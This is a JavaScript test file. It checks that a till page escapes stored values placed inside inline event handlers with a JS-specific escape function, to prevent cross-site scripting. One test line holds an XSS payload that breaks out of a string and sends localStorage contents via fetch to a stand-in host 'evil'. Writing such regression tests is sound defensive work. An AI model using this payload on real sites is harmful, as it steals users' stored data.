// tests/till-xss-handlers.test.cjs — reviews5/6 SEC: the till master puts a stored value (item id, bill no, order id, group, payment label)
// inside a QUOTED JS ARGUMENT of an inline handler. esc() alone is not enough there: the browser decodes &#39; to ' before the JS runs, so a
// value with a quote ends the string and the rest runs. The one escape for that spot is escJs (till.html, same logic as web helpers.js).
'use strict';
const fs = require('fs'), path = require('path');
const src = fs.readFileSync(path.join(__dirname, '..', 'tools', 'tally-connector', 'till.html'), 'utf8');
let fail = 0;
const t = (name, ok, why) => { console.log((ok ? '  ok  ' : '  FAIL') + ' ' + name + (ok ? '' : ' - ' + (why || ''))); if (!ok) fail++; };
const lift = (name) => { const m = src.match(new RegExp('^var ' + name + ' = function[^\\n]*\\n', 'm')); return m ? m[0] : ''; };
/* esc( straight after the opening of a JS string inside a handler:  (\'' + esc(   ("' + esc(   (&quot;' + esc(   with ( or , before it */
const bad = /[(,]\s*(?:\\''|'"|&quot;')\s*\+\s*esc\(/g;
const hits = []; let m;
while ((m = bad.exec(src))) hits.push(src.slice(0, m.index).split('\n').length);
t('no esc( inside a quoted JS argument of an inline handler (use escJs)', hits.length === 0, 'lines ' + hits.slice(0, 10).join(','));
const fn = lift('escJs');
t('till.html defines escJs', fn !== '');
if (fn) {
  const escJs = new Function(lift('esc') + fn + '; return escJs;')();
  const payload = "x');fetch('//evil/?'+btoa(JSON.stringify(localStorage)));//";
  const attr = escJs(payload);
  const decoded = attr.replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&');
  t('the payload decoded as the browser does stays one string', !/['"<>]/.test(decoded));
  t('the string value round-trips', new Function("return '" + decoded + "'")() === payload);
  t('a plain id is left readable', escJs('ITM-12') === 'ITM-12');
}
process.exit(fail ? 1 : 0);
